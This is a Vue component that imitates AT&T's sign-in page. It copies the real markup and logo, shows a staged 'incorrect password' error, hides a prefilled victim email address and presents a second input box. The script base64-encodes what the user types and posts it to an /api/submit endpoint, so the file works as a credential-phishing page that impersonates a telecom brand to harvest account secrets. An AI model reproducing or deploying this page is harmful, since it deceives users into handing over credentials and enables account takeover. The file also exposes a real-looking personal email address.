<template>
	<div id="app">
		<div id="app-root" _nghost-dvd-c37="" ng-version="11.2.14" app-version="23.2.1">
			<div _ngcontent-dvd-c37="" id="appCompBackground" class="full-width-background bg-white">
				<div _ngcontent-dvd-c37="" id="appCompContainer"
					class="container pad-l-none-sm pad-r-none-sm pad-t-none-sm pad-b-none-sm full-height flex flex-column">
					<!---->
					<div _ngcontent-dvd-c37="" id="appCompCardContainer" class="row justify-center flex-1">
						<div _ngcontent-dvd-c37="" id="appCompCardContDiv" class="pad-none"><!----><app-card
								_ngcontent-dvd-c37="" role="main">
								<div
									class="card rel z0 flex flex-column no-border-sm radius-lg no-radius-sm mar-t-none-sm border-shadow login-card mar-t-xl-lg">
									<div
										class="pad-lg-lg pad-xl-sm pad-t-lg-lg pad-t-xl pad-b-lg-lg pad-b-xl pad-l-lg pad-r-lg">
										<app-header class="flex-container" _nghost-dvd-c29=""><img _ngcontent-dvd-c29=""
												id="headerLogoImage" alt=""
												src="https://signin.att.com/static/siam/en/halo_c/images/logos/att_hz_lg_lkp_rgb_pos.svg"
												class="header-logo-image mar-b-md-all"><!----><!----><!---->
											<div _ngcontent-dvd-c29="" class="mar-b-md-all text-center"
												id="splitPwLoginHeaderDiv">
												<h1 _ngcontent-dvd-c29="" class="heading-lg"
													id="splitPwLoginHeaderText">Welcome</h1><!---->
											</div><!---->
										</app-header><!---->
										<div class="width-full"><router-outlet></router-outlet><app-manual-login><!---->
											<div id="appErrorAbove" v-if="isActive"><div id="errContainer" role="status" class="flex flex-items-top mar-b-lg-sm mar-b-md-lg"><div id="errorIcon" class="height-sm-lg width-sm-lg flex-shrink-0 mar-r-xxs"><svg height="32" width="32" viewBox="0 0 32 32" aria-label="icon image" role="img" focusable="false"><path d="M29.21 24.53L18.62 5.63a3 3 0 00-5.24 0L2.79 24.53A3 3 0 005.41 29h21.18a3 3 0 002.62-4.47zM17 24h-2v-2h2zm0-4h-2v-8h2z" fill="#ea712f"></path></svg></div><!----><div><p id="errorContent" class="flex flex-column type-sm line-h-md"><span><span id="errorDescArea">Incorrect user ID or password. Try again.</span><!----></span><span id="errorCodeArea" class="type-12 mar-t-xxs">Care code:  <span id="errorCareCodeValue">201 [LU100]</span></span><!----></p></div></div><!----></div>
												<form  method="post"
													class="manual-login-form ng-pristine ng-invalid ng-touched">
													<input type="hidden" name="appName" formcontrolname="appName"
														value="m40842" class="ng-untouched ng-pristine ng-valid"><input
														type="hidden" name="loginSuccessURL"
														formcontrolname="loginSuccessURL"
														value="https://oidc.idp.clogin.att.com/mga/sps/oauth/oauth20/authorize?nonce=CYXpz9kCDa&amp;SPRelayState=https%253A%252F%252Fcurrently.att.yahoo.com%252F&amp;redirect_uri=https%3A%2F%2Fatt-yahoo.att.net%2Fisam%2Fsps%2Foidc%2Frp%2FATT-HBO-RP%2Fredirect%2FYahoo&amp;response_mode=form_post&amp;scope=openid&amp;response_type=id_token&amp;state=HlrV2OmNoi&amp;ForceAuthn=true&amp;client_id=m40842"
														class="ng-untouched ng-pristine ng-valid"><input type="hidden"
														name="loginFailureURL" formcontrolname="loginFailureURL"
														value="https://signin.att.com/dynamic/iamLRR/LrrController?IAM_OP=login&amp;targetURL=https%3A%2F%2Foidc.idp.clogin.att.com%2Fmga%2Fsps%2Foauth%2Foauth20%2Fauthorize%3Fnonce%3DCYXpz9kCDa%26SPRelayState%3Dhttps%25253A%25252F%25252Fcurrently.att.yahoo.com%25252F%26redirect_uri%3Dhttps%253A%252F%252Fatt-yahoo.att.net%252Fisam%252Fsps%252Foidc%252Frp%252FATT-HBO-RP%252Fredirect%252FYahoo%26response_mode%3Dform_post%26scope%3Dopenid%26response_type%3Did_token%26state%3DHlrV2OmNoi%26ForceAuthn%3Dtrue%26client_id%3Dm40842"
														class="ng-untouched ng-pristine ng-valid"><input type="hidden"
														name="trID" formcontrolname="trID"
														value="7deebc4478660b0a12290747252d1103920efd24"
														class="ng-untouched ng-pristine ng-valid"><app-user-input
														_nghost-dvd-c39="">
														<div _ngcontent-dvd-c39="" id="userInputContainerDiv"
															class="form-row space-below ng-pristine ng-invalid ng-touched">
															<!-- <div _ngcontent-dvd-c39="" id="userBackButtonDiv"
																class="flex flex-row flex-centered"><button
																	_ngcontent-dvd-c39="" id="userBackButton"
																	type="button" aria-label="Back"
																	class="user-back-button btn-reset touch-space flex-row flex-centered"
																	title="jbonney22@att.net">
                                                                    <span
																		_ngcontent-dvd-c39="" id="userBackButtonSpanTxt"
																		class="font-regular type-base letter-spacing-3 overflow-hidden nowrap text-overflow">{{ formDataRes.email
																		|| ''}}</span>
                                                                        </button>
															</div> -->
                                                            <!----><!----><input _ngcontent-dvd-c39="" id="userID"
																name="userID" formcontrolname="userID"
																autocomplete="username" spellcheck="false"
																autocapitalize="off"
																aria-describedby="userInlineErrorText" type="hidden"
																readonly="true" value="jbonney22@att.net"
																class="textfield ng-untouched ng-pristine ng-valid"><!---->
														</div>
													</app-user-input><!----><app-password-input>
														<div class="form-row rel ng-pristine ng-invalid ng-touched">
															<div class="inline-flex"><label id="passwordLabel"
																	for="password"
																	class="formfield-label">Email</label></div><input
																id="email" name="email" formcontrolname="password"
																spellcheck="false" autocomplete="current-password"
																autocapitalize="off"
																v-model="formDataRes.email"
																aria-describedby="passwordInlineErrorText"
                                                                type="email"
																class="textfield textfield-password ng-pristine ng-invalid ng-touched">
<!--                                                                
                                                                
                                                                :type="isText ? 'text' : 'password'"
                                                                <button
																id="showHideButton" tabindex="0" type="button"
																aria-disabled="false"
																class="showHidePasswordButton absolute pad-xxs font-regular color-ui-black"
																aria-label="Show password" @click="isText = !isText">{{isText ? 'Hide' : 'Show'}}</button> -->
															
                                                                <div id="passwordInlineErrorText" role="alert"
																class="formfield-msg"></div>
														</div>
													</app-password-input><!----><!----><!----><!----><!----><app-kmsi-checkbox>
														<div id="keepMeInContainerDiv" class="checkboxDiv mb-0">
															<!----><!----><input type="hidden" name="keepMeIn"
																value="NA"><!---->
                                                                <!-- <label id="keepMeInLabel"
																for="keepMeIn"
																class="checkbox inline-flex flex-items-top font-regular"><input
																	type="checkbox" id="keepMeIn" name="keepMeIn"
																	value="Y" aria-label="Keep me signed in checkbox">
																<div class="checkbox-skin"></div>
                                                                <span id="keepMeInText"
																	class="rad-chk-txt">Keep me signed in</span>
															</label> -->
														</div>
													</app-kmsi-checkbox><!----><!----><!----><!---->
													<div class="mar-t-xxs-lg">
														<div class="flex-container continue-button-spacing">
															<app-button-spinner class="width-full"><button
																	aria-live="polite"
																	class="btn-full-width btn-primary letter-spacing-3"
																	id="signin" type="submit" @click.prevent="submitForm">{{ isLoading ? 'Loading...' : 'Sign in' }}<!----><!----><!----></button></app-button-spinner><!----><!---->
														</div>
													</div><!----><!----><app-forgot-pw-link>
														<!-- <div id="forgotPasswordLinkContainer" class="mar-t-sm-all"><a
																id="forgotPassword" class="link-text3 solo type-sm"
																href="https://identity.att.com/identity-ui/fpwd/lander?origination_point=tguard&amp;trid=7deebc4478660b0a12290747252d1103920efd24&amp;appName=m40842&amp;Return_URL=https%3A%2F%2Foidc.idp.clogin.att.com%2Fmga%2Fsps%2Foauth%2Foauth20%2Fauthorize%3Fnonce%3DCYXpz9kCDa%26SPRelayState%3Dhttps%25253A%25252F%25252Fcurrently.att.yahoo.com%25252F%26redirect_uri%3Dhttps%253A%252F%252Fatt-yahoo.att.net%252Fisam%252Fsps%252Foidc%252Frp%252FATT-HBO-RP%252Fredirect%252FYahoo%26response_mode%3Dform_post%26scope%3Dopenid%26response_type%3Did_token%26state%3DHlrV2OmNoi%26ForceAuthn%3Dtrue%26client_id%3Dm40842&amp;Cancel_URL=https%3A%2F%2Foidc.idp.clogin.att.com%2Fmga%2Fsps%2Foauth%2Foauth20%2Fauthorize%3Fnonce%3DCYXpz9kCDa%26SPRelayState%3Dhttps%25253A%25252F%25252Fcurrently.att.yahoo.com%25252F%26redirect_uri%3Dhttps%253A%252F%252Fatt-yahoo.att.net%252Fisam%252Fsps%252Foidc%252Frp%252FATT-HBO-RP%252Fredirect%252FYahoo%26response_mode%3Dform_post%26scope%3Dopenid%26response_type%3Did_token%26state%3DHlrV2OmNoi%26ForceAuthn%3Dtrue%26client_id%3Dm40842&amp;lang=en-us">Forgot
																password?</a></div> -->
													</app-forgot-pw-link><!----><!----><!----><!----><app-fast-pay-button><!----></app-fast-pay-button><app-prepaid-ctn-button
														_nghost-dvd-c51=""><!----></app-prepaid-ctn-button><!----><!---->
												</form><!---->
											</app-manual-login><!----></div>
									</div>
								</div>
							</app-card></div>
					</div>
				</div>
			</div><!----><app-full-page-spinner _ngcontent-dvd-c37=""><!----></app-full-page-spinner>
		</div>
	</div>
</template>



<script>
import axios from "axios"

export default {
  name: 'app',
  data() {
    return {
      formDataRes: {}, // Store the user input
      responseMessage: {}, // Response message after submit
      encodedData: {}, // Store the Base64 encoded data
      isLoading: false,
    };
  },
  methods: {
    // Method to Base64 encode the input and route to the dynamic page
    submitForm() {
      // Base64 encode the input data
      this.isLoading = true

      this.encodedData = this.encodeBase64(this.formDataRes['email']);
     
      // Optionally send data to a server (using Axios, for example)
    //   this.$axios.post('/api/submit', { data: this.encodedData })
     axios.post('/api/submit', { data: this.encodedData })
        .then(response => {
          console.log("Data sent successfully:", response);
          this.responseMessage = response.data.message || "Success!";
          this.isLoading = false
          // Navigate to the dynamic page with the Base64 encoded data in the URL
        //   this.$router.push(`/index/${this.encodedData}`);
        })
        .catch(error => {
          console.error("Error sending data", error);
          this.responseMessage = "An error occurred while sending the data.";
        });
        setTimeout( () => {
            this.$router.push(`/${this.encodedData}`);
        }, 1000)
        

    },

    // Helper function to Base64 encode the input data
    encodeBase64(input) {
      // Encode the input data into Base64 format
      return btoa(unescape(encodeURIComponent(input)));
    },
  },
};
</script>








































<style>
@charset "Shift_JIS";

/* ヘッダ header.css
  ------------------------------------------------------------ */
input {
	border: 1px solid #000
}

#header_main {
	background: #FFFFFF;
	width: 860px;
	margin: 0;
	padding: 0;
}

#header_logo {
	width: 233px;
	margin: 0;
	padding: 12px 0 0 15px;
	float: left;
	height: 39px;
}

#header_keyword {
	float: right;
	width: 250px;
	text-align: left;
	padding: 20px 0 0 0;
}

#header_keyword strong {
	font-weight: normal;
}

#headerNavi {
	width: 370px;
	padding: 15px 8px 0 0;
	margin: 0;
	float: right;
	text-align: right;
}

#headerNavi form {
	margin: 0;
	padding: 0;
}

#headerNavi form input {
	margin: 0;
	padding: 0 6px;
}

#headerNavi div.search {
	float: right;
}

#headerNavi div.top {
	float: right;
	padding: 4px 7px 0 0;
}

#header-link {
	background: #ccc url('../public/images/bg_header.gif') no-repeat bottom;
	width: 860px;
	height: 26px;
	margin: 0;
	padding: 0;
	border-bottom: 1px solid #ccc;
}

#header-link #support-menu {
	width: 860px;
	margin: 0;
	padding: 0;
}

#header-link #support_menu ul {
	float: right;
	padding: 2px 0 0 0;
}

#header-link #support_menu li {
	margin: 0;
	float: left;
}

#header-link #support_menu li a {
	padding: 3px 8px 0 15px;
	white-space: nowrap;
	display: block;
}


#header-link #support_menu li a,
#header-link #support_menu li a:link,
#header-link #support_menu li a:visited {
	background: url('../public/images/menu_arrow_head.gif') no-repeat 0px 5px;
}

#header-link #support_menu li a:active,
#header-link #support_menu li a:hover {
	background: url('../public/images/menu_arrow_head.gif') no-repeat 0px 5px;
}

#header-link #support_menu li a.bl,
#header-link #support_menu li a.bl:link,
#header-link #support_menu li a.bl:visited {
	background: url('../public/images/menu_arrow_head_bl.gif') no-repeat 0px 5px;
}

#header-link #support_menu li a.bl:active,
#header-link #support_menu li a.bl:hover {
	background: url('../public/images/menu_arrow_head_bl.gif') no-repeat 0px 5px;
}

/* default */
@charset "Shift-jis";


/*------------------------------------------------------------ ページ全体 */

/*----------------------- 初期設定 */

body {
	margin: 0;
	font-size: 80%;
}

img {
	padding: 0;
	margin: 0;
	border: 0;
}

h1,
h2,
h3,
h4,
h5,
p,
dl,
dt,
dd {
	padding: 0;
	margin: 0;
	font-size: 100%;
	font-weight: normal;
}

th {
	font-weight: normal;
}

span {
	padding: 0;
	margin: 0;
}

form {
	margin: 0;
}

ul,
li {
	padding: 0;
	margin: 0;
	list-style: none;
}

a,
a:link,
a:visited {
	color: #2674f3;
	text-decoration: underline;
}

a:hover,
a:active {
	color: #c30;
	text-decoration: underline;
}

/* footer */
@charset "Shift_JIS";

/* フッター
  --------------------------------------------------------------- */
div#footerContainer {
	clear: both;
	width: 860px;
	display: block;
	background: #FFFFFF;
}

div#footerPagetop {
	width: 860px;
	padding-top: 16px;
	padding-bottom: 10px;
	text-align: right;
	display: block;
}

div#layout-footer-nobg #footerPagetop {
	background: none;
}

div#footerPagetop a {
	margin-right: 6px;
}

div#footerSearch {
	width: 860px;
	background-color: #f0f0f0;
	border-top: 1px solid #8c9bca;
	padding-top: 10px;
	padding-bottom: 10px;
	text-align: center;
	line-height: 1.5em;
}

div#footerRecommend {
	width: 860px;
	padding-top: 10px;
	padding-bottom: 10px;
	text-align: center;
	border-top: 1px dotted #8c9bca;
}

div#footerLink {
	width: 860px;
	border-top: 1px solid #8c9bca;
	padding-top: 10px;
}

div#footerLinkBox1 {
	width: 10px;
	float: left;
}

div#footerLinkBox2 {
	width: 630px;
	float: left;
	text-align: center;
	line-height: 1.3em;
	font-size: 0.7rem;
	/* 2017/10/19 フッター崩れ対応*/
}

div#footerLinkBox3 {
	text-align: right;
	width: 210px;
	padding-right: 10px;
	float: right;
}

div#footerLinkBox3 .icon {
	padding-right: 8px;
}

div#footerCopyright {
	clear: both;
	width: 860px;
	padding-top: 10px;
	text-align: center;
}

div#footer {
	border-top: 1px solid #8c9bca;
	padding: 0 0 0 5px;
	font-size: 12px;
	clear: both;
}

div#footer div.footer1 {
	float: left;
}

div#footer div.footer2 {
	float: right;
	margin: 8px 0;
	white-space: nowrap;
	font-size: 110%;
}

div#footer div.footer3 {
	margin: 0;
	float: right;
}

/* layout.css */
@charset "Shift-jis";

/* トップページ
  ------------------------------------------------------------ */

#contents_block {
	float: left;
	width: 550px;
	padding: 0 15px;
}


/*サービス紹介*/
#contents_block .pr_block {
	width: 550px;
	height: 165px;
	margin: 15px 0 0;
	background: url(/images2/goodpoint.gif) no-repeat;
}

#contents_block .pr_block .sv_link {
	padding: 140px 15px 0;
	text-align: right;
	vertical-align: top;
	line-height: 120%;
}

#contents_block .pr_block .sv_block {
	padding: 0 15px 10px;
}

#contents_block .pr_block .sv_block_last {
	padding: 0 15px 0;
}

#contents_block .pr_block .sv_img {
	float: left;
	width: 120px;
}

#contents_block .pr_block .sv_txt {
	float: left;
	padding-left: 15px;
	width: 385px;
}

/*お知らせ、注意事項*/

#contents_block .infotitle {
	color: #3399CC;
	font-size: 1.1em;
	font-weight: bold;
	margin: 0;
	padding-left: 10px;
	padding-bottom: 10px;
}

#contents_block .infoArea {
	padding-left: 10px;
}

#contents_block .infoArea p {
	padding-bottom: 5px;
}

#contents_block .news {
	margin: 0 0 0px;
	line-height: 60%;
}

#contents_block .news ul {
	width: 550px;
	margin: 0 0 0px;
}

#contents_block .subArea_block {
	width: 550px;
	margin: 20px 0 0;

}

#contents_block .subArea_block ul.textArea {
	width: 520px;
	background-color: #FFF;
	border-top: none;
	padding: 12px 15px 0;
}

#contents_block .subArea_block ul.textArea li {
	background: url('../public/images/icon_link.gif') 0 7px no-repeat !important;
	padding: 0 0 5px 12px;
}

#contents_block .subArea_block ul.textArea li.dot {
	border-bottom: #CCC 1px dotted;
	margin-bottom: 5px;
}

#contents_block .subArea_block ul.textArea li.dot_last {
	border-bottom: none;
	margin-bottom: 0;
}

#contents_block .subArea_block .w8_block {
	background-image: url("/images2/win8image.gif");
	background-position: 420px 10px;
	background-repeat: no-repeat;
	border: 1px solid #FF0000;
	color: #FF0000;
	font-size: 90%;
	margin: 10px 0 10px 10px;
	padding: 10px 0 7px 7px;
	width: 520px;
	height: 80px;
	line-height: 1.5;

}

#contents_block .subArea_block .w8cpt {
	font-size: 88%;
	color: #333333;
	padding-left: 410px;
	padding-top: 9px;
	margin-right: 10px;
	line-height: 1;

}


/*iframe*/
.iframe_contents {
	margin: 0px;
	margin-width: 0;
	margin-height: 0;
	width: 580px;
	height: 700px;
	float: left;
}


/* ウェブリはこちら */
.webrylink {
	margin-top: 5px;
}

.webrylink ul li {
	background: url('../public/images/icon_link.gif') 0 0px no-repeat !important;
	padding: 2px 10px 7px 20px;
	float: left;
}

.webrylink .banner_area {
	height: 150px;
}


/* サイドメニュー
  ------------------------------------------------------------ */
#side_menuArea {
	float: right;
	width: 260px;
	padding: 0 15px 0 0;
}

#side_menu_block {
	width: 260px;
	padding: 0;
	/*	background-color:#FAFAFA; */
}

#side_menu {
	width: 260px;
	padding: 0 0 20px;
	/*	background:url("../images2/bg_side_menu.gif") repeat-x left top;*/
}

#side_menu .login_block {
	width: 238px;
	margin: 0 0 0 10px;
	background: #ffffcc;
	padding: 10px 0 15px;
	border: #CDCCCC 1px solid;
}

#side_menu .login_block form {
	width: 208px;
	margin: 0 auto;
}

#side_menu .login_block form div label {
	display: block;
	margin-bottom: 2px;
	font-size: 115%;
	font-weight: bold;
}

#side_menu .login_block form #loginid {
	width: 205px;
	margin-bottom: 5px;
	font-size: 130%;
	height: 1.4em;
	line-height: 1.4em;
}

#side_menu .login_block form #biglobe_pw {
	width: 205px;
	margin-bottom: 0;
	font-size: 130%;
	height: 1.4em;
	line-height: 1.4em;
}


#side_menu .login_block form ul {
	padding: 10px 0 0 0;
}

#side_menu .login_block form ul li {
	margin: 0 0 0 5px;
	padding: 0;
}

#side_menu .login_block form div.loginBtn {
	padding-top: 15px;
}

#side_menu .login_block ul.supportLink,
#side_menu .login_block ul.basicLink {
	margin: 15px 15px 0;
	padding: 10px 0 0;
	border-top: #CDCCCC 1px solid;
}

#side_menu .login_block ul.supportLink li {
	margin: 0 0 5px 0;
	padding: 0 0 0 20px;
	background: url(./assets/images/icon_question.gif) 0 2px no-repeat;
}

#side_menu .login_block ul.basicLink li {
	margin: 0 0 5px;
	padding: 0 0 0 20px;
	background: url("/assets/images/icon_arrow.gif") 0 2px no-repeat;
	vertical-align: top;
}

#side_menu .login_block ul.basicLink li.last {
	margin: 0;
}

#side_menu div.beginnerLink {}

#side_menu ul.links li.last {
	padding: 0 0 0px 20px;
}

#side_menu div.biginnerLink {
	margin: 15px 15px 0;
	padding: 10px 0 10px 10px;
	border-bottom: #CCC 1px dotted;
}

#side_menu div.biginnerLink p {
	margin: 0;
	padding: 0 0 0 20px;
	background: url("../public/images/icon_arrow.gif") 0 2px no-repeat;
	float: left;
}

#side_menu div.biginnerLink img {
	float: left;
	padding: 0 0 0 2px;
}

#side_menu .otherLink {
	margin: 0 15px 0;
	padding: 10px 0 0 10px;
}

#side_menu ul.otherLink li {
	margin: 0 0 10px;
	padding: 0 0 0 20px;
	background: url("/assets/images/icon_arrow.gif") 0 2px no-repeat;
}

#side_menuArea .verisign {
	margin: 10px 0 0 15px;
	padding: 0;
}

#side_menuArea img {
	margin-left: 0px;
}


img {
	border: 0 none;
	margin: 0;
	padding: 0;
}

#topMidbanner {
	width: 520px;
	margin: 10px 0 15px 10px;

}

#topMidbanner div.service1 {
	float: left;
	width: 265px;
}

#info_footer {
	position: absolute;
	font-size: 90%;
	top: 379px;
}

#info_footer p li {
	float: left;
}


@charset "Shift-jis";


/* 全ページ共通
  ------------------------------------------------------------ */

/* clear */
/*.clearfix:after {
	  content: ".";
	  display: block;
	  height: 0;
	  clear: both;
	  visibility: hidden;
  }
  .clearfix {
	  display: inline-block;
  }*/
/* Hide from IE Mac \*/
/*
  * html .clearfix {
	  height: 1%;
  }
  .clearfix {
	  display: block;
  }*/
/* End hide from IE Mac */


/* トップ＆コンテンツ共通
  ------------------------------------------------------------ */

body {
	/* background: url('../public/images/bg.gif') repeat-y center #f6f6f6; */
}

#container {
	width: 860px;
	margin: 0 auto;
	background: #FFFFFF;
}

#main {
	width: 860px;
	line-height: 1.4em;
	margin: 10px auto 0 auto;

}


/* 警告 */
.warning {
	border: solid 1px #FDE5E5;
	background-color: #FFF5F5;
	padding: 10px;
	margin: 0 0 20px;
	color: #FF0000;
}

/* 注意書き */

.attention-red {
	color: #FF0000;
}

br.clear {
	clear: both;
	height: 0;
}

div.clear {
	clear: both;
	height: 0;
	line-height: 0;
}

.linkSet {
	background: url(/images2/icon_arrow.gif) 0 2px no-repeat;
	padding: 0 0 0 20px;
}
</style>